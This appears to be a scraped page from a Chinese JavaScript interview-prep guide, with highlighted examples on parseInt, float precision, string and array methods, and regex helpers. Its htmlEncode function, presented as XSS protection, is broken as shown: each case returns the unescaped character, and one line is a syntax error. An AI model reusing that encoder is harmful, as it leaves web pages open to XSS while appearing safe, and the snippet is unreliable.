console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token keyword">typeof</span> objNum<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// string </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token keyword">typeof</span> objStr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// string</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h4 id="_5-进制及精度相关"><a href="#_5-进制及精度相关" class="header-anchor">#</a> 5:进制及精度相关</h4> <h5 id="进制计算"><a href="#进制计算" class="header-anchor">#</a> 进制计算</h5> <blockquote><h4 id="_1-2-3-map-parseint-答案是多少"><a href="#_1-2-3-map-parseint-答案是多少" class="header-anchor">#</a> [&quot;1&quot;, &quot;2&quot;, &quot;3&quot;].map(parseInt) 答案是多少</h4></blockquote> <p>parseInt() 函数能解析一个字符串，并返回一个整数，需要两个参数 (val, radix)，其中 radix 【该值介于 2 ~ 36 之间，并且字符串中的数字不能大于radix才能正确返回数字结果值】; 但此处 map 传了 3 个 (element, index, array),</p> <p><strong>因为二进制里面，没有数字3,导致出现超范围的radix赋值和不合法的进制解析，才会返回NaN</strong>
所以[&quot;1&quot;, &quot;2&quot;, &quot;3&quot;].map(parseInt) 答案也就是：<strong>[1, NaN, NaN]</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code> <span class="token keyword">function</span> <span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> radix</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">return</span> str <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> radix<span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;3&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>parseInt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [&quot;1-0&quot;, &quot;2-1&quot;, &quot;3-2&quot;] 不能大于radix</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;3&quot;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>parseInt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[ 1, NaN, NaN ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;10&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//返回 10</span>
<span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;19&quot;</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//返回 19 (10+9)</span>
<span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;11&quot;</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//返回 3 (2+1)</span>
<span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;17&quot;</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//返回 15 (8+7)</span>
<span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;1f&quot;</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//返回 31 (16+15)</span>
<span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token string">&quot;010&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//未定：返回 10 或 8</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><blockquote><h4 id="javascript最大安全数字与最小安全数字"><a href="#javascript最大安全数字与最小安全数字" class="header-anchor">#</a> JavaScript最大安全数字与最小安全数字？</h4></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token constant">MAX_SAFE_INTEGER</span><span class="token punctuation">)</span><span class="token comment">// 9007199254740991</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token constant">MIN_SAFE_INTEGER</span><span class="token punctuation">)</span><span class="token comment">// -9007199254740991</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h5 id="精确度问题"><a href="#精确度问题" class="header-anchor">#</a> 精确度问题</h5> <blockquote><h4 id="为什么-0-1-0-2-为什么不等于-0-3"><a href="#为什么-0-1-0-2-为什么不等于-0-3" class="header-anchor">#</a> 为什么 0.1 + 0.2 为什么不等于 0.3</h4></blockquote> <p>原因：<strong>JavaScript中小数是浮点数，需转二进制进行运算，有些小数无法用二进制表示，所以只能取近似值，所以造成误差</strong>;</p> <p><strong>js遵循<code>IEEE 754 双精度版本（64位）</code>标准的语言都有的问题</strong>。计算机无法识别十进制，JS会将十进制转换为对应的二进制（二进制即：<code>0</code> 和 <code>1</code>）。</p> <ol><li><p>目前主流的解决方案是 : <strong>先变成整数运算，然后再变回小数</strong></p> <p><strong>先乘再除</strong>;  <code>(0.1*10 + 0.2*10)/10 == 0.3 //true</code></p> <ul><li>比如精确到小数点后2位；<strong>.toFixed(8)</strong></li> <li>先把需要计算的数字都 乘1000</li> <li>计算完成后再把结果 除1000</li></ul></li> <li><p>原生解决办法：<code>parseFloat((0.1 + 0.2).toFixed(10))</code>普通计算</p></li> <li><p>使用新基础类型 <code>BigInt</code> (兼容性很差)</p></li> <li><p>用第三方库；大型计算；</p></li></ol> <p><strong>ps:</strong> toFixed()方法可把Number<strong>四舍五入为指定小数位数的数字</strong>。</p> <blockquote><h4 id="_123-tostring-length"><a href="#_123-tostring-length" class="header-anchor">#</a> 123['toString'].length</h4></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//案例五</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">[</span><span class="token string">'toString'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token comment">// 124</span>
<span class="token comment">//答案：123是数字，数字本质是new Number()，数字本身没有toString方法，则沿着__proto__去function Number()的prototype上找，找到toString方法，toString方法的length是1，1 + 123 = 124，至于为什么length是1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="_6-字符串相关"><a href="#_6-字符串相关" class="header-anchor">#</a> 6:字符串相关</h4> <h5 id="slice-substring-substr-的区别"><a href="#slice-substring-substr-的区别" class="header-anchor">#</a> slice(),substring(),substr()的区别</h5> <p><code>slice()</code>方法返回一个索引和另一个索引之间的字符串，语法如下：跟Array中的slice的用法类似；</p> <blockquote><p>str.slice(beginIndex[, endIndex])</p></blockquote> <p><code>substring()</code>方法返回一个索引和另一个索引之间的字符串，语法如下：<strong>跟splice及Array中的slice的用类似</strong>；  它返回从startIndex到endIndex - 1的子字符串。</p> <blockquote><p>str.substring(indexStart, [indexEnd])</p></blockquote> <p><code>substr()</code>方法返回从指定位置开始的字符串中指定字符数的字符，语法如下：<strong>不设置最后一个就是截取到尾部</strong>; 它从startIndex返回子字符串并返回'length'个字符数。</p> <blockquote><p>str.substr(start, [length])</p></blockquote> <p>比较：</p> <p><code>substring()</code>方法的参数表示起始和结束索引，<code>substr()</code>方法的参数表示起始索引和要包含在生成的字符串中的字符的长度；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token string">&quot;hello&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span> s<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;ell&quot;</span> <span class="token punctuation">)</span> <span class="token comment">// true</span>

<span class="token punctuation">(</span> s<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;ello&quot;</span> <span class="token punctuation">)</span> <span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><blockquote><h4 id="slice-substring-和-substr-的区别"><a href="#slice-substring-和-substr-的区别" class="header-anchor">#</a> slice, substring 和 substr 的区别？</h4></blockquote> <table><thead><tr><th>方法</th> <th>参数</th> <th>描述</th></tr></thead> <tbody><tr><td>slice</td> <td>slice(start, end)</td> <td>从start开始，截取到end - 1，如果没有end，则截取到左后一个元素；</td></tr> <tr><td>substring</td> <td>substring(start,end)</td> <td>返回从start位置开始到end位置的子串**（不包含end）**</td></tr> <tr><td>substr</td> <td>substr(start,length)</td> <td>返回从start位置开始length长度的子串</td></tr></tbody></table> <p><strong>slice的注意点</strong></p> <ul><li>start &gt; end：返回空字符串</li> <li>start &lt; 0：<code>start = 数组长度 + start</code></li></ul> <p><strong>substring功能与<code>slice</code>大致相同</strong></p> <p>区别之处</p> <ul><li><strong>start &gt; end：互换值</strong></li></ul> <p><strong>substr注意点</strong></p> <ul><li>start &lt; 0：<code>start = 数组长度 + start</code></li> <li>length超出所能截取范围，需要做处理</li> <li>length &lt; 0：返回空字符串</li></ul> <blockquote><h4 id="数组的slice-与-splice-的区别"><a href="#数组的slice-与-splice-的区别" class="header-anchor">#</a> 数组的slice 与 splice 的区别？</h4></blockquote> <table><thead><tr><th>方法</th> <th>参数</th> <th>描述</th></tr></thead> <tbody><tr><td>slice</td> <td>slice(start, end)</td> <td>从start开始，截取到end - 1，如果没有end，则截取到左后一个元素，不影响原数组</td></tr> <tr><td>splice</td> <td>splice(start, num, item1,item2, ...)</td> <td>从start索引开始，截取num个元素，并插入item1、item2到原数组里，<strong>影响原数组</strong></td></tr></tbody></table> <blockquote><h4 id="数组中splice-删增改操作"><a href="#数组中splice-删增改操作" class="header-anchor">#</a> 数组中splice，删增改操作</h4></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'zh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'zh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'zh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span>
arr1<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;===删除===&quot;</span><span class="token punctuation">,</span> arr1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[ 2, 3, 'zh' ]</span>
arr2<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;===增加===&quot;</span><span class="token punctuation">,</span> arr2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[ 'add', 'samy', 2, 3, 'zh' ]</span>
arr3<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'mod'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;===修改===&quot;</span><span class="token punctuation">,</span> arr3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[ 'mod', 2, 3, 'zh' ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><blockquote><h4 id="数组中includes-比-indexof好在哪"><a href="#数组中includes-比-indexof好在哪" class="header-anchor">#</a> 数组中includes 比 indexOf好在哪？</h4></blockquote> <p>includes可以检测<code>NaN</code>，indexOf不能检测<code>NaN</code>，includes内部使用了<code>Number.isNaN</code>对<code>NaN</code>进行了匹配；</p> <h5 id="正则匹配"><a href="#正则匹配" class="header-anchor">#</a> 正则匹配</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">trim</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//去除字符串前后空格</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(^\s+)|(\s+$)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//()”代表分组操作; 需要注意的这里的分组的索引值是从1开始的，所以取第一个分组的方法是$1</span>
<span class="token keyword">function</span> <span class="token function">telFormat</span><span class="token punctuation">(</span><span class="token parameter">tel<span class="token punctuation">,</span> space</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//11位手机号格式化; 用到补位符号：$1</span>
    space <span class="token operator">=</span> space <span class="token operator">?</span> space <span class="token operator">:</span> <span class="token string">' '</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">String</span><span class="token punctuation">(</span>tel<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(\d{3})(\d{4})(\d{3})</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">'$1'</span> <span class="token operator">+</span> space <span class="token operator">+</span> <span class="token string">'$2'</span> <span class="token operator">+</span> space <span class="token operator">+</span> <span class="token string">'$3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><blockquote><h5 id="现千位分隔符-方式一-正则方式-方式二-正常思维逻辑"><a href="#现千位分隔符-方式一-正则方式-方式二-正常思维逻辑" class="header-anchor">#</a> 现千位分隔符 ; 方式一：正则方式； 方式二：正常思维逻辑；</h5></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">numFormat</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//功能兼容性最全； str.replace( /\B(?=(?:\d{3})+$)/g, ',' );</span>
  <span class="token keyword">var</span> res <span class="token operator">=</span> num<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\d+</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 先提取整数部分</span>
    <span class="token keyword">return</span> n<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(\d)(?=(\d{3})+$)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">$<span class="token number">0</span><span class="token punctuation">,</span> $<span class="token number">1</span><span class="token punctuation">,</span> $<span class="token number">2</span><span class="token punctuation">,</span> $<span class="token number">3</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">{</span><span class="token comment">//正则匹配数据；</span>
      <span class="token comment">//console.log('-------&gt;', $0, $1, $2, $3);</span>
      <span class="token keyword">return</span> $<span class="token number">1</span> <span class="token operator">+</span> <span class="token string">&quot;,&quot;</span><span class="token punctuation">;</span><span class="token comment">//直接替换匹配的那个字符，加上，</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// var a = 1234567894532;</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">a1234567894532</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token number">673439.4542</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">numFormat</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &quot;1,234,567,894,532&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><blockquote><h5 id="实现html编码-将-等字符进行转义-避免-xss-攻击-。"><a href="#实现html编码-将-等字符进行转义-避免-xss-攻击-。" class="header-anchor">#</a> 实现HTML编码，将&lt; / &gt; &quot; &amp; ` 等字符进行转义，避免 XSS 攻击 。</h5></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">htmlEncode</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//匹配&lt; / &gt; &quot; &amp; `</span>
    <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[&lt;&gt;&quot;&amp;\/`]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">rs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>rs<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token string">&quot;&lt;&quot;</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;&lt;&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">&quot;&gt;&quot;</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;&gt;&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">&quot;&amp;&quot;</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;&amp;&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">&quot;\&quot;&quot;</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;&quot;</span>&quot;<span class="token punctuation">;</span>
            <span class="token keyword">case</span> <span class="token string">&quot;/&quot;</span><span class="token operator">:</span> 
                <span class="token keyword">return</span> <span class="token string">&quot;/&quot;</span>
            <span class="token keyword">case</span> <span class="token string">&quot;`&quot;</span><span class="token operator">:</span>
                <span class="token keyword">return</span> <span class="token string">&quot;'&quot;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><blockquote><h5 id="提取url的部分获取参数示例"><a href="#提取url的部分获取参数示例" class="header-anchor">#</a> 提取URL的部分获取参数示例：</h5></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">parseQueryString</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> arr <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> params<span class="token punctuation">;</span>
  arr <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;&amp;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> l<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> a <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    params<span class="token punctuation">[</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> params<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">&quot;http://baidu.com?key0=0&amp;key1=1&amp;key2=2&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> ps <span class="token operator">=</span> <span class="token function">parseQueryString</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ps<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//{ key0: '0', key1: '1', key2: '2' }</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>ps<span class="token punctuation">[</span><span class="token string">&quot;key1&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>正则方式实现：replace + 分组实现；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//通过replace方法获取url中的参数的方法</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">pro</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">queryString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">([^?&amp;#+]+)=([^?&amp;#+]+)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>reg<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">$<span class="token number">0</span><span class="token punctuation">,</span>$<span class="token number">1</span><span class="token punctuation">,</span>$<span class="token number">2</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            obj<span class="token punctuation">[</span>$<span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> $<span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    pro<span class="token punctuation">.</span>queryString <span class="token operator">=</span> queryString<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 例如 url为 https://www.baidu.com?a=1&amp;b=2</span>
<span class="token comment">// window.location.href.queryString();</span>
<span class="token comment">// {a:1,b:2}</span>
